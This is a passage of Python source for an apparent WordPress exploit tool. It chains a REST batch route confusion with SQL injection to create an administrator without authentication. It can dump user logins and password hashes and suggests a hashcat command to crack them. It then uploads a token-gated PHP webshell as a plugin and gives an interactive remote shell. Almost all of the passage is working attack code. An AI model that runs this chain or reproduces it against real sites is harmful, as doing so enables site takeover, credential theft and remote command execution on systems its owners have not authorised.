      5. Read back the three oEmbed cache post IDs written in step 2.
      6. Build a _PoisonGraph: forge a customize_changeset row that embeds a
         nav_menu_item pointing at user_id=<existing admin>.
      7. _render_union_posts: fire the forged rows via UNION ALL SELECT into
         /wp/v2/widgets, then append a POST /wp/v2/users sub-request so the
         customizer creates the new administrator in the same batch.
    """

    _ADMIN_PREFIX    = "wp2_"
    _PASSWORD_PREFIX = "Wp2!"
    _EMAIL_DOMAIN    = "wp2shell.invalid"
    _NAV_URL         = "https://example.invalid/"

    def __init__(self, base_url: str, *, http: Optional[HttpConfig] = None,
                 rest_route: Optional[bool] = None,
                 sqlite: bool = False) -> None:
        self.base_url = base_url.rstrip("/")
        self.http     = http or HttpConfig()
        self.sqlite   = sqlite
        self.client   = BatchClient(base_url, http=self.http,
                                    rest_route=rest_route)
        self._opener  = self.http.opener()

    def create_admin(
        self,
        log: Optional[Callable[[str], None]] = None,
    ) -> CreatedAdmin:
        """
        Execute the full pre-auth admin creation chain.

        Optional *log* callback receives human-readable step messages
        as each stage completes, suitable for a progress display.
        """
        def _step(msg: str) -> None:
            if log:
                log(msg)

        _step("Checking UNION SQLi primitive availability...")
        sqli = UnionSQLi(self.client, sqlite=self.sqlite)
        if not sqli.available():
            raise RuntimeError(
                "UNION fake-post primitive not available "
                "(patched, or persistent object cache in use)")
        _step("UNION channel confirmed — can forge fake wp_posts rows.")

        # ── resolve DB structure before the slow priming step ──────────────────
        db_label = "sqlite_master" if self.sqlite else "INFORMATION_SCHEMA"
        _step(f"Extracting wp_posts table name from {db_label}...")
        posts_table = self._posts_table(sqli)
        prefix      = posts_table[:-5]          # strip "_posts"
        _step(f"Posts table: {posts_table}  (prefix: {prefix})")

        _step("Extracting first existing administrator user ID...")
        admin_id = self._first_admin_id(sqli, prefix)
        _step(f"Source admin ID: {admin_id}")

        # ── oEmbed anchor URLs ─────────────────────────────────────────────────
        _step("Locating a public post for oEmbed anchor URLs...")
        nonce  = secrets.token_hex(6)
        embeds = self._loopback_embed_urls(nonce)
        _step(f"Public post anchor: {embeds[0].split('#')[0]}")

        # ── prime oEmbed cache (one request per URL to avoid PHP time limits) ──
        _step("Seeding oEmbed cache posts (one per embed URL)...")
        prime_errors: List[str] = []
        for i, url in enumerate(embeds):
            try:
                content = f'[embed width="500" height="750"]{url}[/embed]'
                self._render_union_posts(
                    [_wp_posts_tuple(0, body=content,
                                     title=f"seed{i}", slug=f"seed{i}",
                                     sqlite=self.sqlite)])
                _step(f"  Seeded embed {i+1}/3.")
            except Exception as exc:
                prime_errors.append(str(exc))
                _step(f"  Warning: seed {i+1}/3 error: {exc}")

        # ── recover cache post IDs ─────────────────────────────────────────────
        _step("Recovering oEmbed cache post IDs from database...")
        try:
            backing = self._oembed_backing_ids(sqli, posts_table, embeds)
        except RuntimeError as exc:
            # Fallback: use any 3 existing oembed_cache posts (avoids needing
            # a successful loopback write — works when SiteGround or a WAF
            # blocks the server-side oEmbed HTTP/REST calls).
            _step(f"  Primary lookup failed ({exc}); trying existing cache posts...")
            backing = self._oembed_backing_ids_any(sqli, posts_table)
        for i, cid in enumerate(backing, 1):
            _step(f"  Cache post #{i}: {cid}")
        _step("All cache post IDs recovered.")

        username = f"{self._ADMIN_PREFIX}{nonce}"
        password = f"{self._PASSWORD_PREFIX}{secrets.token_urlsafe(15)}"
        email    = f"{username}@{self._EMAIL_DOMAIN}"

        _step("Building poison graph and firing customizer user-create batch...")
        self._submit_user_write(
            backing, embeds, admin_id,
            {"username": username, "password": password,
             "email": email, "roles": ["administrator"]})

        return CreatedAdmin(username, password, email, admin_id, prefix)

    # ── internals ────────────────────────────────────────────────────────────

    def _posts_table(self, sqli: UnionSQLi) -> str:
        if self.sqlite:
            # SQLite has no INFORMATION_SCHEMA — use sqlite_master instead.
            # RIGHT() / CHAR_LENGTH() don't exist in SQLite; use substr/length.
            t = sqli.extract(
                "SELECT name FROM sqlite_master "
                "WHERE type='table' AND name LIKE '%posts' "
                "ORDER BY length(name),name LIMIT 1")
        else:
            t = sqli.extract(
                "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
                "WHERE TABLE_SCHEMA=DATABASE() "
                "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
                "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1")
        if not re.fullmatch(r"[A-Za-z0-9_$]+", t):
            raise RuntimeError(
                f"could not recover wp_posts table name (got: {t!r})")
        return t

    def _first_admin_id(self, sqli: UnionSQLi, prefix: str) -> int:
        cap = _db_hex(prefix + "capabilities", sqlite=self.sqlite)
        ser = _db_hex('s:13:"administrator";b:1;', sqlite=self.sqlite)
        aid = sqli.integer(
            f"SELECT u.ID FROM `{prefix}users` u "
            f"JOIN `{prefix}usermeta` m ON m.user_id=u.ID "
            f"WHERE m.meta_key={cap} AND INSTR(m.meta_value,{ser})>0 "
            f"ORDER BY u.ID LIMIT 1")
        if aid < 1:
            raise RuntimeError("could not find an existing administrator ID")
        return aid

    def _loopback_embed_urls(self, nonce: str) -> List[str]:
        link = self._first_public_post_link()
        s    = urllib.parse.urlsplit(link)
        return [
            urllib.parse.urlunsplit(
                (s.scheme, s.netloc, s.path, s.query, f"{nonce}{i}"))
            for i in range(3)
        ]

    def _first_public_post_link(self) -> str:
        """
        Return any publicly-accessible URL on this WordPress install.
        Tries four strategies so the chain works even when:
          - REST API is disabled or requires authentication
          - The site has no published posts (pages-only install)
          - pretty-permalinks are off (/?p=1 style links work fine)
        """
        # 1. REST /wp/v2/posts  (standard case)
        try:
            with self._open_rest("/wp/v2/posts",
                                 {"per_page": "1", "_fields": "link"}) as r:
                posts = json.loads(r.read())
            if posts and posts[0].get("link"):
                return posts[0]["link"]
        except Exception:
            pass

        # 2. REST /wp/v2/pages  (blogs with no posts but has pages)
        try:
            with self._open_rest("/wp/v2/pages",
                                 {"per_page": "1", "_fields": "link"}) as r:
                pages = json.loads(r.read())
            if pages and pages[0].get("link"):
                return pages[0]["link"]
        except Exception:
            pass

        # 3. Scrape homepage — first internal <a href> pointing to this host
        try:
            req  = urllib.request.Request(
                self.base_url + "/",
                headers=self.http.merge_headers())
            html = self._opener.open(req, timeout=self.http.timeout
                                     ).read().decode("utf-8", "replace")
            base_host = urllib.parse.urlsplit(self.base_url).netloc
            for href in re.findall(r'href=["\']([^"\']+)["\']', html):
                if href.startswith(("http://", "https://")):
                    if urllib.parse.urlsplit(href).netloc == base_host:
                        return href
                elif href.startswith("/") and len(href) > 1:
                    return self.base_url + href
        except Exception:
            pass

        # 4. Last resort — homepage itself is a valid oEmbed seed URL
        warn("Could not find a specific post/page link; "
             "using homepage as oEmbed seed URL.")
        return self.base_url + "/"

    def _prime_oembed_posts(self, embeds: List[str]) -> None:
        """Seed oEmbed cache for each embed URL — one request per URL."""
        for i, url in enumerate(embeds):
            content = f'[embed width="500" height="750"]{url}[/embed]'
            self._render_union_posts(
                [_wp_posts_tuple(0, body=content,
                                 title=f"seed{i}", slug=f"seed{i}",
                                 sqlite=self.sqlite)])

    def _oembed_backing_ids(self, sqli: UnionSQLi,
                             posts_table: str, embeds: List[str]) -> List[int]:
        oembed_type = _db_hex("oembed_cache", sqlite=self.sqlite)
        ids = []
        for u in embeds:
            cache    = hashlib.md5((u + _OEMBED_SIZE).encode()).hexdigest()
            name_lit = _db_hex(cache, sqlite=self.sqlite)
            ids.append(sqli.integer(
                f"SELECT ID FROM `{posts_table}` "
                f"WHERE post_type={oembed_type} "
                f"AND post_name={name_lit} "
                f"ORDER BY ID DESC LIMIT 1"))
        if any(i < 1 for i in ids) or len(set(ids)) != 3:
            raise RuntimeError(
                f"could not recover three unique oEmbed cache post IDs: {ids}")
        return ids

    def _oembed_backing_ids_any(self, sqli: UnionSQLi,
                                 posts_table: str) -> List[int]:
        """
        Fallback: return IDs of ANY 3 existing oembed_cache posts.

        Used when _prime_oembed_posts fails (loopback blocked by SiteGround /
        WAF / PHP time-limit) so there are no fresh cache entries for our embed
        URLs.  Any 3 real post IDs are valid backing references for the poison
        graph — the customizer chain only needs them to exist in the DB.
        """
        oembed_type = _db_hex("oembed_cache", sqlite=self.sqlite)
        ids: List[int] = []
        for offset in range(3):
            try:
                pid = sqli.integer(
                    f"SELECT ID FROM `{posts_table}` "
                    f"WHERE post_type={oembed_type} "
                    f"ORDER BY ID DESC LIMIT {offset},1")
                if pid > 0:
                    ids.append(pid)
            except ValueError:
                break
        # Last resort: use ANY 3 published posts (IDs guaranteed to exist)
        offset = 0
        while len(ids) < 3:
            try:
                pid = sqli.integer(
                    f"SELECT ID FROM `{posts_table}` "
                    f"WHERE post_status={_db_hex('publish', sqlite=self.sqlite)} "
                    f"ORDER BY ID DESC LIMIT {offset},1")
                if pid > 0 and pid not in ids:
                    ids.append(pid)
                offset += 1
            except ValueError:
                break
        if len(ids) < 3 or len(set(ids)) < 3:
            raise RuntimeError(
                "could not find 3 backing post IDs — no oEmbed cache or published posts")
        return ids[:3]

    def _submit_user_write(self, backing: List[int], embeds: List[str],
                            source_admin_id: int,
                            user_body: Dict[str, object]) -> None:
        g    = _PoisonGraph(backing, source_admin_id)
        rows = g.rows(
            self._changeset_payload(g.nav_item_id, source_admin_id),
            embeds[1], sqlite=self.sqlite)
        # Two identical POST /wp/v2/users are intentional.
        # The confusion routing in CVE-2026-63030 consumes the first request
        # internally; only the second one reaches the real users handler and
        # creates the account.  Removing either breaks the chain.
        self._render_union_posts(rows, tail_requests=[
            {"method": "POST", "path": "/wp/v2/users", "body": user_body},
            {"method": "POST", "path": "/wp/v2/users", "body": user_body},
        ])

    def _changeset_payload(self, nav_item_id: int, user_id: int) -> str:
        return json.dumps(
            {f"nav_menu_item[{nav_item_id}]": {
                "type": "nav_menu_item", "user_id": user_id, "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0,
                    "position": 0, "type": "custom", "title": "generated",
                    "url": self._NAV_URL, "target": "", "attr_title": "",
                    "description": "", "classes": "", "xfn": "",
                    "status": "publish", "nav_menu_term_id": 0,
                    "_invalid": False}}},
            separators=(",", ":"))

    def _render_union_posts(self, post_rows: List[str],
                             tail_requests: Optional[List[dict]] = None) -> None:
        union = ("1) AND 1=0 UNION ALL SELECT " +
                 " UNION ALL SELECT ".join(post_rows) + " -- -")
        # /wp/v2/posts/999999?author_exclude=... routes through the confused
        # posts handler (no per_page cap, no ORDER BY restriction).
        reqs = [
            _PRIMER,
            {"method": "GET", "path": "/wp/v2/posts/999999?" + urllib.parse.urlencode(
                {"author_exclude": union, "orderby": "none", "per_page": "500"})},
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
        if tail_requests:
            reqs.extend(tail_requests)
        # 90 s budget: shared-hosting PHP limits are typically 30–60 s per request.
        self._nested_batch(reqs, timeout=90)

    def _nested_batch(self, requests: List[dict], *, timeout: float) -> None:
        old               = self.http.timeout
        self.http.timeout = timeout
        try:
            resp = self.client.post({"requests": [
                _PRIMER,
                {"method": "POST", "path": "/wp/v2/posts",
                 "body": {"requests": requests}},
                {"method": "POST", "path": "/batch/v1",
                 "body": {"requests": []}},
            ]})
        finally:
            self.http.timeout = old
        if resp.status >= 400:
            raise TargetError(
                f"nested batch request returned HTTP {resp.status}")

    def _open_rest(self, route: str, query: Dict[str, str]):
        self.client.resolve()
        if self.client.rest_route:
            url = (f"{self.base_url}/?" +
                   urllib.parse.urlencode({"rest_route": route, **query}))
        else:
            url = (f"{self.base_url}/wp-json{route}?" +
                   urllib.parse.urlencode(query))
        req = urllib.request.Request(url, headers=self.http.merge_headers())
        return self._opener.open(req, timeout=self.http.timeout)


# ──────────────────────── version fingerprint + classify ──
def _get_text(opener, url: str, headers: dict, timeout: float) -> str:
    try:
        return opener.open(
            urllib.request.Request(url, headers=headers),
            timeout=timeout).read().decode("utf-8", "replace")
    except Exception:
        return ""


def detect_version(base: str,
                   http: HttpConfig) -> Optional[Tuple[int, int, int]]:
    opener  = http.opener()
    headers = http.merge_headers()
    base    = base.rstrip("/") + "/"
    cands: List[str] = []

    # 1. wp-json / ?rest_route= generator field
    for path in ("wp-json/", "?rest_route=/"):
        body = _get_text(opener, urllib.parse.urljoin(base, path),
                         headers, http.timeout)
        for m in re.finditer(r'"generator":"[^"]*?(\d+\.\d+(?:\.\d+)?)"', body):
            cands.append(m.group(1))
        if cands:
            break

    # 2. RSS feed
    if not cands:
        for path in ("feed/", "feed/rss2/"):
            body = _get_text(opener, urllib.parse.urljoin(base, path),
                             headers, http.timeout)
            for m in re.finditer(r"[?&]v=(\d+\.\d+(?:\.\d+)?)", body):
                cands.append(m.group(1))
            if cands:
                break

    # 3. readme.html
    if not cands:
        body = _get_text(opener, urllib.parse.urljoin(base, "readme.html"),
                         headers, http.timeout)
        m = re.search(r"[Vv]ersion\s+(\d+\.\d+(?:\.\d+)?)", body)
        if m:
            cands.append(m.group(1))

    # 4. <meta name="generator">
    if not cands:
        body = _get_text(opener, base, headers, http.timeout)
        m    = re.search(
            r'name=["\']generator["\'][^>]*content=["\']WordPress\s+'
            r'(\d+\.\d+(?:\.\d+)?)', body)
        if m:
            cands.append(m.group(1))

    for raw in cands:
        parts = [int(x) for x in raw.split(".")[:3] if x.isdigit()]
        while len(parts) < 3:
            parts.append(0)
        if len(parts) == 3:
            return (parts[0], parts[1], parts[2])
    return None


def classify(v: Optional[Tuple[int, int, int]]) -> str:
    if v is None:
        return _paint("33", "unknown (could not fingerprint)")
    vs = ".".join(map(str, v))
    if v in _PATCHED or v > (7, 0, 2):
        return _paint("32",  f"{vs}  (patched)")
    if v in _FULL_CHAIN:
        return _paint("31",  f"{vs}  VULNERABLE – full RCE chain")
    if v in _SQLI_ONLY:
        return _paint("33",  f"{vs}  SQLi bug present; batch chain NOT reachable (needs 6.9.0+)")
    return     _paint("33",  f"{vs}  (out of documented range)")


# ── structural fallback: was the inner request dispatched as posts? ──
_POST_MARKERS = ('"date_gmt"', '"comment_status"', '"ping_status"', '"sticky"')


def confusion_structural(client: BatchClient) -> Optional[bool]:
    """
    Inject a harmless huge author id. If the inner response body contains
    post-specific keys, the confusion was active even without block_cannot_read.
    """
    try:
        resp  = client.inject("99999999")
        inner = resp.json()["responses"][1]["body"]["responses"][1]["body"]
    except Exception:
        return None
    blob = json.dumps(inner)
    if any(m in blob for m in _POST_MARKERS):
        return True
    if isinstance(inner, list) and inner and '"taxonomy"' not in blob:
        return True
    return False


# ─────────────────────────────────── RCE: plugin webshell ──
_MARKER   = "WP2SHELL"
_CWD_MARK = "__wp2shellcwd__"


class AdminSession:
    """
    Authenticated admin session: upload a token-gated PHP webshell as a
    plugin ZIP, then run arbitrary OS commands through it.

    The webshell responds only when the correct secret token is supplied as
    the 't' query parameter; the default command is benign (id).
    """

    def __init__(self, base_url: str, *,
                 http: Optional[HttpConfig] = None) -> None:
        self.base_url = base_url.rstrip("/")
        self.http     = http or HttpConfig()
        self._slug    = "wp2shell_" + secrets.token_hex(4)
        self._token   = secrets.token_hex(16)
        self._jar     = CookieJar()
        self._opener  = self.http.opener(
            urllib.request.HTTPCookieProcessor(self._jar))

    def _rebuild_opener(self) -> None:
        """Rebuild the opener so that any insecure=True change on http is honoured."""
        self._jar    = CookieJar()
        self._opener = self.http.opener(
            urllib.request.HTTPCookieProcessor(self._jar))

    def login(self, user: str, password: str) -> bool:
        """POST credentials to wp-login.php; success = wordpress_logged_in cookie.

        Rebuilds the opener before each attempt so that SSL insecure mode
        (auto-enabled on first SSL error) is always reflected in the cookie jar.
        """
        # Rebuild opener: picks up any http.insecure=True set by the SSL fallback
        # so the SAME cookie jar is used throughout the full login flow.
        self._rebuild_opener()
        self._get("/wp-login.php")   # prime session/testcookie
        self._post(
            "/wp-login.php",
            {
                "log":         user,
                "pwd":         password,
                "wp-submit":   "Log In",
                "redirect_to": f"{self.base_url}/wp-admin/",
                "testcookie":  "1",
            },
            # explicit Content-Type so every server accepts the form body
            {"Content-Type": "application/x-www-form-urlencoded"},
        )
        return any(c.name.startswith("wordpress_logged_in")
                   for c in self._jar)

    def deploy_webshell(self) -> str:
        """
        Upload a plugin ZIP containing a token-gated PHP webshell.
        Returns the webshell path relative to base_url.
        """
        page  = self._get("/wp-admin/plugin-install.php?tab=upload")
        nonce = self._nonce(page)
        if not nonce:
            raise RuntimeError(
                "plugin-upload nonce not found "
                "(are the credentials valid and admin-capable?)")
        body, ctype = self._multipart(
            {"_wpnonce":             nonce,
             "_wp_http_referer":    "/wp-admin/plugin-install.php?tab=upload",
             "install-plugin-submit": "Install Now"},
            {"pluginzip": (f"{self._slug}.zip", self._plugin_zip())},
        )
        self._post("/wp-admin/update.php?action=upload-plugin",
                   body, {"Content-Type": ctype})
        return f"/wp-content/plugins/{self._slug}/{self._slug}.php"

    def install_zip(self, zip_path: str, zip_data: bytes,
                    slug: str) -> "Optional[str]":
        """
        Upload an existing plugin ZIP from disk.  Does NOT activate it.
        Returns the relative /wp-content/plugins/…/….php path on success,
        or None when the upload response contains no success markers.
        """
        page  = self._get("/wp-admin/plugin-install.php?tab=upload")
        nonce = self._nonce(page)
        if not nonce:
            warn("Plugin-upload nonce not found — cannot install mm.zip.")
            return None
        body, ctype = self._multipart(
            {"_wpnonce":               nonce,
              "_wp_http_referer":      "/wp-admin/plugin-install.php?tab=upload",
              "install-plugin-submit": "Install Now"},
            {"pluginzip": (os.path.basename(zip_path), zip_data)},
        )
        resp = self._post("/wp-admin/update.php?action=upload-plugin",
                          body, {"Content-Type": ctype})
        low = resp.lower()
        if ("plugin installed successfully" in low
                or "installed successfully"  in low
                or "successfully installed"  in low
                or "plugin already installed" in low
                or f"/wp-content/plugins/{slug}" in low):
            return f"/wp-content/plugins/{slug}/{slug}.php"
        return None

    def run(self, shell_path: str, command: str) -> Optional[str]:
        """Execute a command via the deployed webshell; returns stdout or None."""
        q   = urllib.parse.urlencode({"t": self._token, "c": command})
        out = self._get(f"{shell_path}?{q}")
        m   = re.search(rf"{_MARKER}::(.*?)::END", out, re.S)
        return m.group(1) if m else None

    # ── internals ────────────────────────────────────────────────────────────

    def _get(self, path: str) -> str:
        req = urllib.request.Request(
            self.base_url + path, headers=self.http.merge_headers())
        return self.http.send(self._opener, req).body

    def _post(self, path: str, data, headers: Optional[dict] = None) -> str:
        if isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(
            self.base_url + path, data=data,
            headers=self.http.merge_headers(headers or {}))
        return self.http.send(self._opener, req).body

    def _plugin_zip(self) -> bytes:
        """Build an in-memory ZIP with a single PHP file — the token-gated webshell."""
        php = (
            "<?php\n"
            "/*\n"
            "Plugin Name: wp2shell\n"
            "Description: Research webshell — DELETE AFTER TESTING.\n"
            "*/\n"
            f"if (hash_equals('{self._token}', "
            f"(string)($_GET['t'] ?? '')) && isset($_GET['c'])) {{\n"
            f"    echo '{_MARKER}::' . shell_exec((string)$_GET['c']) . '::END';\n"
            f"}}\n"
        )
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr(f"{self._slug}/{self._slug}.php", php)
        return buf.getvalue()

    @staticmethod
    def _nonce(html: str) -> Optional[str]:
        """Extract the _wpnonce value from the plugin-upload form."""
        m = re.search(
            r'action="[^"]*action=upload-plugin".*?'
            r'name="_wpnonce"[^>]*value="([0-9a-f]+)"',
            html, re.S)
        if m:
            return m.group(1)
        m = re.search(
            r'<input[^>]*name="_wpnonce"[^>]*value="([0-9a-f]+)"', html)
        return m.group(1) if m else None

    @staticmethod
    def _multipart(fields: Dict[str, str],
                   files:  Dict[str, Tuple[str, bytes]]) -> Tuple[bytes, str]:
        boundary = "----wp2shell" + uuid.uuid4().hex
        buf      = io.BytesIO()
        for name, value in fields.items():
            buf.write(f"--{boundary}\r\n".encode())
            buf.write(
                f'Content-Disposition: form-data; name="{name}"'
                f'\r\n\r\n{value}\r\n'.encode())
        for name, (filename, content) in files.items():
            buf.write(f"--{boundary}\r\n".encode())
            buf.write(
                f'Content-Disposition: form-data; name="{name}"; '
                f'filename="{filename}"\r\n'.encode())
            buf.write(
                b"Content-Type: application/octet-stream\r\n\r\n"
                + content + b"\r\n")
        buf.write(f"--{boundary}--\r\n".encode())
        return buf.getvalue(), f"multipart/form-data; boundary={boundary}"


def _repl(session: AdminSession, path: str) -> None:
    """Interactive shell REPL over the deployed webshell."""
    pwd = session.run(path, "pwd")
    if pwd is None:
        bad("Webshell not responding; aborting interactive mode.")
        return
    cwd = pwd.strip() or "/"
    info("Interactive shell — 'exit' or Ctrl-D to quit.")
    while True:
        try:
            line = input(_paint("36", f"{cwd} $ "))
        except (EOFError, KeyboardInterrupt):
            print()
            return
        cmd = line.strip()
        if not cmd:
            continue
        if cmd in ("exit", "quit"):
            return
        out = session.run(
            path,
            f"cd {shlex.quote(cwd)} 2>/dev/null; {cmd}; "
            f"printf '{_CWD_MARK}%s' \"$(pwd)\"")
        if out is None:
            bad("No response from webshell.")
            continue
        body, marker, tail = out.rpartition(_CWD_MARK)
        if marker:
            cwd = tail.strip() or cwd
            out = body
        out = out.rstrip("\n")
        if out:
            print(out)


# ─────────────────────────────────────────────────── commands ──

def _http(a: argparse.Namespace) -> HttpConfig:
    headers: Dict[str, str] = {}
    for h in getattr(a, "header", None) or []:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    return HttpConfig(
        timeout    = getattr(a, "timeout",    30.0),
        proxy      = getattr(a, "proxy",      None),
        insecure   = getattr(a, "insecure",   False),
        headers    = headers,
        user_agent = getattr(a, "user_agent", None) or _DEFAULT_UA,
        retries    = getattr(a, "retries",    2),
        delay      = getattr(a, "delay",      0.0),
    )


def _rr(a: argparse.Namespace) -> Optional[bool]:
    return True if getattr(a, "rest_route", False) else None


# ── check ──────────────────────────────────────────────────────────────────
def cmd_check(a: argparse.Namespace) -> int:
    hc         = _http(a)
    hc.timeout = max(hc.timeout, a.sleep + 10)
    client     = BatchClient(a.url, http=hc, rest_route=_rr(a),
                             variant=a.variant)

    ver = detect_version(a.url, hc)
    info(f"WordPress version: {classify(ver)}")

    try:
        probe = client.probe()
    except TargetError as e:
        bad(str(e))
        return 1
    if probe.status != 207:
        bad(f"Batch endpoint returned HTTP {probe.status} (not 207) — "
            "patched, blocked, or REST API disabled.")
        return 1
    good(f"Batch endpoint reachable and unauthenticated (HTTP 207) "
         f"at {client.endpoint}")

    # Primary: version-independent permission-confusion marker
    if client.confusion_markers():
        good("Route confusion ACTIVE — categories request answered by the "
             "block-renderer handler (block_cannot_read); "
             "CVE-2026-63030 confirmed.")
    else:
        structural = confusion_structural(client)
        if structural:
            good("Route confusion ACTIVE "
                 "(structural: inner request returned posts data).")
        else:
            warn("Route confusion markers not observed "
                 "(may be patched or filtered).")

    sqli = BlindSQLi(client, sleep=a.sleep)
    if sqli.confirm():
        good("SQL injection CONFIRMED — boolean-blind differential over "
             "author__not_in (CVE-2026-60137).")
        base, delayed = sqli.time_delay()
        if delayed - base >= a.sleep - 1.0:
            good(f"Time-based channel also confirmed — "
                 f"baseline {base:.2f}s vs injected {delayed:.2f}s.")
        else:
            info(f"Time-based delta {delayed - base:.2f}s; "
                 "boolean channel is authoritative here.")
        return 0

    bad("Not exploitable via this chain — "
        "boolean differential did not separate true/false.")
    return 1


# ── read ───────────────────────────────────────────────────────────────────
def _do_read(sqli: BlindSQLi, *, prefix: str, preset: str,
             query: Optional[str], max_length: int) -> None:
    if query:
        info(f"Reading: {query}")
        val = sqli.extract(query, max_length=max_length, on_char=_progress)
        _clear_progress()
        good(f"Result: {val}")
    elif preset == "fingerprint":
        if sqli.sqlite:
            fp_queries = (
                ("SQLite version", "SELECT sqlite_version()"),
                ("DB file",        "SELECT file FROM pragma_database_list LIMIT 1"),
                ("User tables",    "SELECT COUNT(*) FROM sqlite_master WHERE type='table'"),
            )
        else:
            fp_queries = (
                ("MySQL version", "SELECT @@version"),
                ("DB user",       "SELECT CURRENT_USER()"),
                ("DB name",       "SELECT DATABASE()"),
            )
        for label, expr in fp_queries:
            good(f"{label}: {sqli.extract(expr, max_length=max_length)}")
    elif preset == "users":
        table = f"{prefix}users"
        try:
            total = sqli.integer(f"SELECT COUNT(*) FROM {table}")
        except ValueError:
            bad(f"Could not read row count from {table} "
                "(wrong --prefix, or sink returns no rows).")
            return
        info(f"{total} user(s) in {table}.")
        saw_wp_hash = False
        for off in range(total):
            if sqli.sqlite:
                # SQLite: use || for string concat; CAST ID to TEXT
                row_expr = (
                    f"SELECT (CAST(ID AS TEXT) || '|' || user_login || '|' || user_pass) "
                    f"FROM {table} ORDER BY ID LIMIT {off},1"
                )
            else:
                row_expr = (
                    f"SELECT CONCAT_WS(0x7c,ID,user_login,user_pass) "
                    f"FROM {table} ORDER BY ID LIMIT {off},1"
                )
            row = sqli.extract(row_expr, max_length=max_length, on_char=_progress)
            _clear_progress()
            good(row)
            saw_wp_hash = saw_wp_hash or "$wp$" in row or "$P$" in row
        if saw_wp_hash:
            info("Crack WP password hashes with: "
                 "hashcat -m 400 hashes.txt wordlist.txt  ($P$B phpass)")
    info(f"{sqli.requests} request(s) sent.")


def cmd_read(a: argparse.Namespace) -> int:
    hc     = _http(a)
    client = BatchClient(a.url, http=hc, rest_route=_rr(a), variant=a.variant)

    # ── step 1: batch endpoint reachable? ────────────────────────────────────
    try:
        probe = client.probe()
    except TargetError as exc:
        bad(f"Cannot reach batch endpoint: {exc}")
        return 1
    if probe.status != 207:
        bad(f"Batch endpoint returned HTTP {probe.status} (expected 207).")
        warn("REST API may be disabled, the endpoint may be blocked by a WAF, "
             "or WordPress is already patched.")
        return 1
    good(f"Batch endpoint reachable at {client.endpoint}")

    # ── step 2: route confusion active? ──────────────────────────────────────
    if not client.confusion_markers():
        structural = confusion_structural(client)
        if not structural:
            bad("Route confusion (CVE-2026-63030) NOT detected.")
            warn("This WordPress version may be patched (≥6.9.5 / ≥7.0.2), "
                 "or a WAF is stripping the marker.\n"
                 "       Run `check` first to investigate.")
            return 1
        info("Route confusion confirmed (structural marker).")
    else:
        good("Route confusion confirmed (block_cannot_read marker).")

    # ── step 3: boolean oracle working? ──────────────────────────────────────
    sleep = getattr(a, "sleep", 8.0)
    # Each time-based request blocks for up to sleep seconds server-side;
    # give generous headroom: sleep × 2 + 30s for slow/high-latency targets.
    hc.timeout = max(hc.timeout, sleep * 2 + 30)
    sqli = BlindSQLi(client, sqlite=getattr(a, "sqlite", False), sleep=sleep)

    bool_true  = sqli._true("1=1")
    bool_false = not sqli._true("1=0")
    bool_ok    = bool_true and bool_false

    if bool_ok:
        good("Boolean oracle working (1=1 → rows, 1=0 → empty).")
        # ── step 4: subquery channel ─────────────────────────────────────────
        if not sqli._true("(SELECT 1)=1"):
            bad("Subquery channel FAILED: (SELECT 1)=1 returned no rows.")
            warn("Try --variant categories or report the target version.")
            return 1
        good("Subquery channel working.")
    else:
        # ── boolean failed — diagnose and try time-based ──────────────────────
        if not bool_true:
            warn("Boolean oracle FAILED on 1=1 (no rows) — "
                 "SQL output is suppressed (WAF/security plugin filtering results).")
        else:
            warn("Boolean oracle FAILED on 1=0 (rows returned regardless) — "
                 "possible object-cache serving stale data.")

        info(f"Trying time-based oracle (SLEEP={sleep:g}s) ...")
        try:
            base_t, delayed_t = sqli.time_delay()
        except Exception as exc:
            bad(f"Time-based probe error: {exc}")
            return 1

        delta = delayed_t - base_t
        if delta >= sleep * 0.75:
            good(f"Time-based oracle CONFIRMED — "
                 f"base={base_t:.1f}s  delay={delayed_t:.1f}s  delta={delta:.1f}s")
            sqli = BlindSQLi(client, sqlite=getattr(a, "sqlite", False),
                             sleep=sleep, time_mode=True)
            warn("Extraction via time-based channel is slow "
                 f"(~{sleep:g}s × 7 requests per character).")
        else:
            bad(f"Time-based oracle also failed — "
                f"delta only {delta:.1f}s (expected ≥{sleep*0.75:.1f}s).")
            warn("The SQL injection does not appear to execute on this target.\n"
                 "       Possible reasons: patched WP version, WAF blocking at network\n"
                 "       level, or no SQLi sink reachable via this chain.")
            return 1

    # ── step 5: auto-detect table prefix if default wp_ fails ────────────────
    prefix = a.prefix
    if a.preset == "users" and not a.query:
        try:
            sqli.integer(f"SELECT COUNT(*) FROM {prefix}users")
        except ValueError:
            warn(f"Table '{prefix}users' not readable — trying to auto-detect prefix ...")
            if sqli.time_mode:
                # time-based prefix detection: test common prefixes directly
                for candidate in ("wp_", "wordpress_", "wp1_", "blog_"):
                    try:
                        n = sqli.integer(f"SELECT COUNT(*) FROM {candidate}users")
                        if n >= 0:
                            prefix = candidate
                            good(f"Auto-detected table prefix: {prefix!r}")
                            break
                    except ValueError:
                        continue
                else:
                    bad("Could not auto-detect table prefix.")
                    warn("Pass --prefix manually, e.g. --prefix mysite_")
                    return 1
            else:
                detected = sqli.extract(
                    "SELECT SUBSTRING(TABLE_NAME,1,LENGTH(TABLE_NAME)-5) "
                    "FROM INFORMATION_SCHEMA.TABLES "
                    "WHERE TABLE_SCHEMA=DATABASE() "
                    "AND TABLE_NAME LIKE '%users' "
                    "ORDER BY CHAR_LENGTH(TABLE_NAME) LIMIT 1",
                    max_length=32)
                if detected and re.fullmatch(r"[A-Za-z0-9_$]+", detected):
                    good(f"Auto-detected table prefix: {detected!r}  "
                         f"(pass --prefix {detected} to skip this step)")
                    prefix = detected
                else:
                    bad("Could not auto-detect table prefix.")
                    warn("Pass --prefix manually, e.g. --prefix mysite_")
                    return 1

    _do_read(sqli, prefix=prefix, preset=a.preset,
             query=a.query, max_length=a.max_length)
    return 0




# ── create-admin (standalone pre-auth admin creation) ─────────────────────
def cmd_create_admin(a: argparse.Namespace) -> int:
    """
    Standalone pre-auth administrator creation via the UNION fake-post chain.

    Does NOT upload a webshell or run any OS command — it only creates a new
